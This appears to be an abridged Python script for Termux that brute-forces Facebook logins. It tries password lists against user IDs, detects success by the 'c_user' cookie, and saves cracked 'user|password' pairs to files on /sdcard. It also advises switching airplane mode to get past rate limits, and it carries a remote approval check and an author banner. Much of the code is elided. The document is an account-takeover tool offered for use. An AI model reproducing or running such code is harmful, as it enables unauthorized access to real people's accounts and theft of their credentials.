...
def main_apv():
    ...
    try:
        ...
        key1=open('/data/data/com.termux/files/usr/bin/.suman-cov', 'r').read()
        ...
        kok=open('/data/data/com.termux/files/usr/bin/.suman-cov', 'w')
    ...
    r1=requests.get("https://github.com/Tremux-Suman/approval.txt/blob/main/approval.txt").text
...
\x1b[1;93m ######   #######  ##     ## ##     ## ##    ## 
 ...
 [$]~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~[$]
  ...
  👉  Author   : Md Suman Hossain

  👉 Facebook : Suman.love420
 ...
 \033[1;32m Use (Airplane) Mod Every 10 senind For Get More Ok iDz \033[1;32m
...
def hasil(OK,cp):
	...
	if len(cp) != 0:
	    ...
	    print('\n\n  \x1b[1;97m Total OK : \x1b[1;97m %s  \x1b[1;97m/sdcard/SUMAN-OK.txt' % (H, P, str(len(ok))))

	    print('  \x1b[1;97m Total CP :\x1b[1;97m   %s \x1b[1;97m/sdcard/SUMAN-CP.txt' % (H, P, str(len(cp))))
...
def R():
			...
			print("               \033[1;92m• Premium Account • \033[1;97m")

			print (' [$]~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~[$]')

			print ("\033[1m [!] Tool    : Md Suman Hossain")
...
class __xxx__:
    ...
    def __metode__(self, user, __chi__, cebok):
        ...
        sys.stdout.write(f"\r \x1b[1;33m[SUMAN]\x1b[1;33m {loop}|{len(self.id)} \x1b[1;32m[ok][{len(ok)}] ")
        ...
        try:
            ...
            for pw in __chi__:
                ...
                if 'c_user' in session.cookies.get_dict():
                    ...
                    print(f"\r{H} [SUMAN-ok 🤫] {user} | {pw}")

                    wrt = '%s|%s' % (user,pw)

                    ok.append(wrt)

                    open('/sdcard/SUMAN_OK.txt' , 'a').write('%s\n' % wrt)
                    ...
                    open('/sdcard/SUMAN_CP.txt' , 'a').write('%s\n' % wrt)
...
def yt():
	...
	os.system("xdg-open https://www.facebook.com/Suman.love420")
